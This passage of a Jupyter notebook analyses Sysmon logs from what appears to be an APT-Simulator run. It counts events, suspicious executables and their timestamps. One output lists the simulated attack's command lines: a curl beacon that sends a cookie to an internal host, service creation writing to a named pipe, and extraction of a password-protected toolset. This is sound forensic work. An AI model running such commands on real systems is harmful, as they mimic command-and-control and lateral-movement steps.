      " 3   RestrictedSidCount     0 non-null      float64\n",
      " 4   ResourceAttributes     0 non-null      object \n",
      " 5   EnabledPrivilegeList   0 non-null      object \n",
      " 6   DisabledPrivilegeList  0 non-null      object \n",
      " 7   OldSd                  0 non-null      object \n",
      " 8   NewSd                  0 non-null      object \n",
      " 9   IpAddress              0 non-null      object \n",
      " 10  IpPort                 0 non-null      float64\n",
      " 11  ShareName              0 non-null      object \n",
      " 12  ShareLocalPath         0 non-null      object \n",
      " 13  RelativeTargetName     0 non-null      object \n",
      " 14  ServiceName            0 non-null      object \n",
      " 15  ServiceFileName        0 non-null      object \n",
      " 16  ServiceType            0 non-null      object \n",
      " 17  ServiceStartType       0 non-null      float64\n",
      " 18  ServiceAccount         0 non-null      object \n",
      " 19  ClientProcessStartKey  0 non-null      float64\n",
      " 20  ClientProcessId        0 non-null      float64\n",
      " 21  ImagePath              0 non-null      object \n",
      " 22  StartType              0 non-null      object \n",
      " 23  AccountName            0 non-null      object \n",
      " 24  param1                 0 non-null      object \n",
      "dtypes: float64(5), object(20)\n",
      "memory usage: 122.5+ KB\n",
      "None\n"
     ]
    }
   ],
   "source": [
    "for i in range(len(x) - 1):\n",
    "    pprint(filtered_spGUID_df.iloc[:, x[i] : x[i + 1]].info())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.hist(filtered_spGUID_df['@timestamp'], bins = 50)\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10    603\n",
       "Name: EventID, dtype: int64"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_spGUID_df['EventID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4    603\n",
       "Name: Level, dtype: int64"
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_spGUID_df['Level'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft-Windows-Sysmon/Operational    603\n",
       "Name: Channel, dtype: int64"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filtered_spGUID_df['Channel'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Windows Defender"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(388, 126)"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def = df[df['RuleName'] == 'MsMpEng']\n",
    "win_def.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [],
   "source": [
    "# for i in range(len(x) - 1):\n",
    "#     pprint(win_def.iloc[:, x[i] : x[i + 1]].info())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "Int64Index: 388 entries, 289 to 2060\n",
      "Data columns (total 22 columns):\n",
      " #   Column             Non-Null Count  Dtype              \n",
      "---  ------             --------------  -----              \n",
      " 0   SourceName         388 non-null    object             \n",
      " 1   ProviderGuid       388 non-null    object             \n",
      " 2   Level              388 non-null    int64              \n",
      " 3   Keywords           388 non-null    object             \n",
      " 4   Channel            388 non-null    object             \n",
      " 5   Hostname           388 non-null    object             \n",
      " 6   TimeCreated        388 non-null    object             \n",
      " 7   @timestamp         388 non-null    datetime64[ns, UTC]\n",
      " 8   EventID            388 non-null    int64              \n",
      " 9   Message            388 non-null    object             \n",
      " 10  Task               388 non-null    int64              \n",
      " 11  RuleName           388 non-null    object             \n",
      " 12  UtcTime            388 non-null    object             \n",
      " 13  SourceProcessGUID  388 non-null    object             \n",
      " 14  SourceProcessId    388 non-null    object             \n",
      " 15  SourceThreadId     388 non-null    float64            \n",
      " 16  SourceImage        388 non-null    object             \n",
      " 17  TargetProcessGUID  388 non-null    object             \n",
      " 18  TargetProcessId    388 non-null    object             \n",
      " 19  TargetImage        388 non-null    object             \n",
      " 20  GrantedAccess      388 non-null    object             \n",
      " 21  CallTrace          388 non-null    object             \n",
      "dtypes: datetime64[ns, UTC](1), float64(1), int64(3), object(17)\n",
      "memory usage: 69.7+ KB\n"
     ]
    }
   ],
   "source": [
    "win_def = win_def.dropna(axis = 1)\n",
    "win_def.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft-Windows-Sysmon    388\n",
       "Name: SourceName, dtype: int64"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['SourceName'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5770385f-c22a-43e0-bf4c-06f5698ffbd9    388\n",
       "Name: ProviderGuid, dtype: int64"
      ]
     },
     "execution_count": 48,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['ProviderGuid'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4    388\n",
       "Name: Level, dtype: int64"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['Level'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x8000000000000000    388\n",
       "Name: Keywords, dtype: int64"
      ]
     },
     "execution_count": 50,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['Keywords'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Microsoft-Windows-Sysmon/Operational    388\n",
       "Name: Channel, dtype: int64"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['Channel'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.hist(win_def['@timestamp'], bins = 30, log = False)\n",
    "plt.title('Timestamp Distro (Date: 2021-06-11)')\n",
    "plt.xlabel('Timestamp')\n",
    "plt.ylabel('Count')\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "10    388\n",
       "Name: EventID, dtype: int64"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['EventID'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://www.eventid.net/display.asp?eventid=10&source="
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "e2c04bb9-a3f6-60c3-8600-000000000300    385\n",
       "e2c04bb9-a346-60c3-0f00-000000000300      2\n",
       "e2c04bb9-a342-60c3-0d00-000000000300      1\n",
       "Name: SourceProcessGUID, dtype: int64"
      ]
     },
     "execution_count": 54,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['SourceProcessGUID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [],
   "source": [
    "# win_def['SourceProcessId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [],
   "source": [
    "# win_def['SourceThreadId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "e2c04bb9-a525-60c3-5601-000000000300    7\n",
       "e2c04bb9-a3ef-60c3-5f00-000000000300    6\n",
       "e2c04bb9-417d-60c3-4000-000000000300    5\n",
       "e2c04bb9-a4e2-60c3-1001-000000000300    5\n",
       "e2c04bb9-a347-60c3-1300-000000000300    5\n",
       "                                       ..\n",
       "e2c04bb9-a70b-60c3-3551-380000000000    5\n",
       "e2c04bb9-a35d-60c3-1c00-000000000300    5\n",
       "e2c04bb9-a3ef-60c3-5a00-000000000300    5\n",
       "e2c04bb9-a718-60c3-6f53-3e0000000000    5\n",
       "e2c04bb9-a41c-60c3-b900-000000000300    5\n",
       "Name: TargetProcessGUID, Length: 77, dtype: int64"
      ]
     },
     "execution_count": 57,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['TargetProcessGUID'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "# win_def['TargetProcessId'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "c:\\windows\\system32\\svchost.exe    388\n",
       "Name: TargetImage, dtype: int64"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['TargetImage'].apply(lambda x: x.lower()).value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "0x1410    385\n",
       "0x1000      3\n",
       "Name: GrantedAccess, dtype: int64"
      ]
     },
     "execution_count": 60,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "win_def['GrantedAccess'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Weird Images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1170, 126)"
      ]
     },
     "execution_count": 61,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df = df.iloc[df['Image'].dropna().index, ]\n",
    "img_df.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(131, 126)"
      ]
     },
     "execution_count": 62,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df = img_df[img_df['Image'].apply(lambda x: 'tmp' in x or 'b6a1458f396' in x)]\n",
    "img_df.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "c:\\tmp\\createnamedpipe.exe    111\n",
       "c:\\windows\\b6a1458f396.exe     20\n",
       "Name: Image, dtype: int64"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df['Image'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.hist(img_df[img_df['Image'] == 'c:\\\\tmp\\\\createnamedpipe.exe']['@timestamp'], bins = 40, histtype = 'step', color = '#ff0000', label = 'c:\\\\tmp\\\\createnamedpipe.exe')\n",
    "plt.hist(img_df[img_df['Image'] == 'c:\\\\windows\\\\b6a1458f396.exe']['@timestamp'], bins = 5, histtype = 'step', color = '#0000ff', label = 'c:\\\\windows\\\\b6a1458f396.exe')\n",
    "plt.legend()\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Timestamp('2021-06-11 09:07:41.245000+0000', tz='UTC')"
      ]
     },
     "execution_count": 65,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df[img_df['Image'] == 'c:\\\\tmp\\\\createnamedpipe.exe']['@timestamp'].max()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Timestamp('2021-06-11 09:07:41.254000+0000', tz='UTC')"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df[img_df['Image'] == 'c:\\\\windows\\\\b6a1458f396.exe']['@timestamp'].min()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       Level\n",
       "c:\\tmp\\createnamedpipe.exe  4        111\n",
       "c:\\windows\\b6a1458f396.exe  4         20\n",
       "dtype: int64"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'Level']).size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       EventID\n",
       "c:\\tmp\\createnamedpipe.exe  1           5\n",
       "                            5           5\n",
       "                            7          86\n",
       "                            13         10\n",
       "                            17          5\n",
       "c:\\windows\\b6a1458f396.exe  1           1\n",
       "                            5           1\n",
       "                            7          18\n",
       "dtype: int64"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'EventID']).size()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Timestamp distro for event ID 7:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "plt.hist(img_df[(img_df['Image'] == r'c:\\tmp\\createnamedpipe.exe') & (img_df['EventID'] == 7)]['@timestamp'], bins = 20, histtype = 'step', color = '#ff0000', label = r'c:\\tmp\\createnamedpipe.exe')\n",
    "plt.hist(img_df[(img_df['Image'] == r'c:\\windows\\b6a1458f396.exe') & (img_df['EventID'] == 7)]['@timestamp'], bins = 5, histtype = 'step', color = '#0000ff', label = r'c:\\windows\\b6a1458f396.exe')\n",
    "# plt.hist(img_df[(img_df['Image'] == r'c:\\tmp\\createnamedpipe.exe') & (img_df['EventID'] == 7)]['@timestamp'], bins = 20, histtype = 'step', color = '#ff0000')\n",
    "# plt.hist(img_df[(img_df['Image'] == r'c:\\tmp\\createnamedpipe.exe') & (img_df['EventID'] == 7)]['@timestamp'], bins = 20, histtype = 'step', color = '#ff0000')\n",
    "plt.legend()\n",
    "plt.show()\n",
    "plt.close()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       SourceName              \n",
       "c:\\tmp\\createnamedpipe.exe  Microsoft-Windows-Sysmon    111\n",
       "c:\\windows\\b6a1458f396.exe  Microsoft-Windows-Sysmon     20\n",
       "dtype: int64"
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'SourceName']).size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       Channel                             \n",
       "c:\\tmp\\createnamedpipe.exe  Microsoft-Windows-Sysmon/Operational    111\n",
       "c:\\windows\\b6a1458f396.exe  Microsoft-Windows-Sysmon/Operational     20\n",
       "dtype: int64"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'Channel']).size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       RuleName\n",
       "c:\\tmp\\createnamedpipe.exe  -           111\n",
       "c:\\windows\\b6a1458f396.exe  -            20\n",
       "dtype: int64"
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'RuleName']).size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ProcessGuid                           Image                     \n",
       "e2c04bb9-08c6-60c4-681f-400100000000  c:\\tmp\\createnamedpipe.exe    22\n",
       "e2c04bb9-08cb-60c4-eb40-400100000000  c:\\tmp\\createnamedpipe.exe    23\n",
       "e2c04bb9-08d0-60c4-5d60-400100000000  c:\\tmp\\createnamedpipe.exe     1\n",
       "e2c04bb9-08d0-60c4-8309-000000000300  c:\\tmp\\createnamedpipe.exe    21\n",
       "e2c04bb9-08d5-60c4-6c7e-400100000000  c:\\tmp\\createnamedpipe.exe     1\n",
       "e2c04bb9-08d5-60c4-8709-000000000300  c:\\tmp\\createnamedpipe.exe    21\n",
       "e2c04bb9-08db-60c4-539f-400100000000  c:\\tmp\\createnamedpipe.exe     1\n",
       "e2c04bb9-08db-60c4-8c09-000000000300  c:\\tmp\\createnamedpipe.exe    21\n",
       "e2c04bb9-08dd-60c4-9209-000000000300  c:\\windows\\b6a1458f396.exe    19\n",
       "e2c04bb9-08dd-60c4-deb8-400100000000  c:\\windows\\b6a1458f396.exe     1\n",
       "dtype: int64"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['ProcessGuid', 'Image']).size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Image                       SignatureStatus\n",
       "c:\\tmp\\createnamedpipe.exe  Unavailable         5\n",
       "                            Valid              81\n",
       "c:\\windows\\b6a1458f396.exe  Unavailable         1\n",
       "                            Valid              17\n",
       "dtype: int64"
      ]
     },
     "execution_count": 74,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "img_df.groupby(['Image', 'SignatureStatus']).size()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Other attributes:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1                                                                                                                                                                                                                                                                                                                                                                                                                                                        14\n",
       "taskkill  /IM CreateNamedPipe.exe /F                                                                                                                                                                                                                                                                                                                                                                                                                                                                           10\n",
       "timeout  /t 5                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   8\n",
       "ping  -n 2 127.0.0.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            6\n",
       "timeout  /t 2                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   4\n",
       "\"C:\\TMP\\CreateNamedPipe.exe\"  postex_ssh_fedac123                                                                                                                                                                                                                                                                                                                                                                                                                                                               4\n",
       "\"C:\\Users\\APT-Simulator\\Documents\\APTSimulator-master\\\\helpers\\curl.exe\"  -s -o /dev/null -I     -H \"Accept: */*\"     -H \"Cookie: cdoWQelsAYyUlsEMuvbfEAfSxSWtkRwhm5OPfZ6K+400BQBsFlxwSSvsZ2IokquiUDKEPTip7MHL5VkYirf74WkZkc29LeJIt38HQA8E79bc2x9wMgnCz7U5mWXTMZLCQPdoc0VNqbpd2ytuxKRm9upFlCgB41h3hu1GrfDt0Q0=\"     -A \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; BOIE9;ENUS)\"     -H \"Connection: Keep-Alive\"     -H \"Cache-Control: no-cache\"     http://10.0.2.15/pixel.gif     2\n",
       "sc  delete tbbd05                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               2\n",
       "\"C:\\TMP\\CreateNamedPipe.exe\"  msagent_fedac123                                                                                                                                                                                                                                                                                                                                                                                                                                                                  2\n",
       "\"C:\\Windows\\system32\\cscript.exe\" /nologo \"MonitorKnowledgeDiscovery.vbs\"                                                                                                                                                                                                                                                                                                                                                                                                                                       2\n",
       "timeout  /t 38                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  2\n",
       "C:\\Windows\\system32\\cmd.exe echo /c b6a1458f396 > \\\\.\\pipe\\334485                                                                                                                                                                                                                                                                                                                                                                                                                                               2\n",
       "b6a1458f396                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     2\n",
       "sc  start tbbd05                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2\n",
       "\"C:\\Users\\APT-Simulator\\Documents\\APTSimulator-master\\\\helpers\\7z.exe\"  e -paptsimulator \"C:\\Users\\APT-Simulator\\Documents\\APTSimulator-master\\\\enc-toolset.7z\" -aoa -o\"C:\\TMP\" toolset\\CreateNamedPipe.exe                                                                                                                                                                                                                                                                                                     2\n",
       "\"C:\\TMP\\CreateNamedPipe.exe\"  334485                                                                                                                                                                                                                                                                                                                                                                                                                                                                            2\n",
       "\"C:\\TMP\\CreateNamedPipe.exe\"  MSSE-1337-server                                                                                                                                                                                                                                                                                                                                                                                                                                                                  2\n",
       "sc  stop tbbd05                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 2\n",
       "ping  -n 3 127.0.0.1                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            1\n",
       "sc  create tbbd05 binpath= \"%COMSPEC% echo /c b6a1458f396 > \\\\.\\pipe\\334485\" DisplayName= \"tbbd05\" start= demand                                                                                                                                                                                                                                                                                                                                                                                                1\n",
       "sc  create tbbd05 binpath= \"%%COMSPEC%% echo /c b6a1458f396 > \\\\.\\pipe\\334485\" DisplayName= \"tbbd05\" start= demand                                                                                                                                                                                                                                                                                                                                                                                              1\n",
       "Name: CommandLine, dtype: int64"
      ]
     },
     "execution_count": 75,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['CommandLine'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "High      32\n",
       "System     5\n",
       "Name: IntegrityLevel, dtype: int64"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['IntegrityLevel'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "6      19\n",
       "1      16\n",
       "tcp     2\n",
       "Name: Protocol, dtype: int64"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Protocol'].value_counts()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "https://www.iana.org/assignments/protocol-numbers/protocol-numbers.xhtml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>SourceName</th>\n",
       "      <th>ProviderGuid</th>\n",
       "      <th>Level</th>\n",
       "      <th>Keywords</th>\n",
       "      <th>Channel</th>\n",
       "      <th>Hostname</th>\n",
       "      <th>TimeCreated</th>\n",
       "      <th>@timestamp</th>\n",
       "      <th>EventID</th>\n",
       "      <th>Message</th>\n",
       "      <th>...</th>\n",
       "      <th>ServiceType</th>\n",
       "      <th>ServiceStartType</th>\n",
       "      <th>ServiceAccount</th>\n",
       "      <th>ClientProcessStartKey</th>\n",
       "      <th>ClientProcessId</th>\n",
       "      <th>ImagePath</th>\n",
       "      <th>StartType</th>\n",
       "      <th>AccountName</th>\n",
       "      <th>param1</th>\n",
       "      <th>param2</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1894</th>\n",
       "      <td>Microsoft-Windows-Sysmon</td>\n",
       "      <td>5770385f-c22a-43e0-bf4c-06f5698ffbd9</td>\n",
       "      <td>4</td>\n",
       "      <td>0x8000000000000000</td>\n",
       "      <td>Microsoft-Windows-Sysmon/Operational</td>\n",
       "      <td>WORKSTATION5</td>\n",
       "      <td>2021-06-11T09:07:42.306Z</td>\n",
       "      <td>2021-06-11 09:07:42.306000+00:00</td>\n",
       "      <td>3</td>\n",
       "      <td>Network connection detected:\\r\\nRuleName: -\\r\\...</td>\n",
       "      <td>...</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "      <td>NaN</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1 rows × 126 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                    SourceName                          ProviderGuid  Level  \\\n",
       "1894  Microsoft-Windows-Sysmon  5770385f-c22a-43e0-bf4c-06f5698ffbd9      4   \n",
       "\n",
       "                Keywords                               Channel      Hostname  \\\n",
       "1894  0x8000000000000000  Microsoft-Windows-Sysmon/Operational  WORKSTATION5   \n",
       "\n",
       "                   TimeCreated                       @timestamp  EventID  \\\n",
       "1894  2021-06-11T09:07:42.306Z 2021-06-11 09:07:42.306000+00:00        3   \n",
       "\n",
       "                                                Message  ...  ServiceType  \\\n",
       "1894  Network connection detected:\\r\\nRuleName: -\\r\\...  ...          NaN   \n",
       "\n",
       "     ServiceStartType ServiceAccount ClientProcessStartKey ClientProcessId  \\\n",
       "1894              NaN            NaN                   NaN             NaN   \n",
       "\n",
       "     ImagePath StartType AccountName param1 param2  \n",
       "1894       NaN       NaN         NaN    NaN    NaN  \n",
       "\n",
       "[1 rows x 126 columns]"
      ]
     },
     "execution_count": 78,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[df['Initiated'] == 'false']"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
